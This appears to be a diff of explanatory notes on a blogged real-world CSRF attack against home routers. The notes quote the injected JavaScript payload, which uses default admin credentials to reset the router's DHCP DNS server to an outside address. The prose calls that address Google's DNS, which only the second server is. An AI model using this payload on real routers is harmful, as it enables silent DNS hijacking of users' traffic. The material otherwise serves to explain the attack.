@@ -2,7 +2,7 @@ In this [blog post](http://www.jakoblell.com/blog/2013/10/30/real-world-csrf-att
 
 In the attack, the attacker uploads javascript to a site that the target visits, which when visited triggers the csrf attack.
 
-The attack code looked like this (wherein the attack changes the DNS settings on the server to point to Google's DNS)
+The attack code looked like this (wherein the attack changes the DNS settings on the router to point to Google's DNS)
 
 ```
 document.writeln('<style type="text/css">@import url(http://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=192.168.1.100&ip2=192.168.1.199&Lease=120&gateway=0.0.0.0&domain=&dnsserver=106.187.36.85&dnsserver2=8.8.8.8&Save=%B1%A3+%B4%E6);</style>')
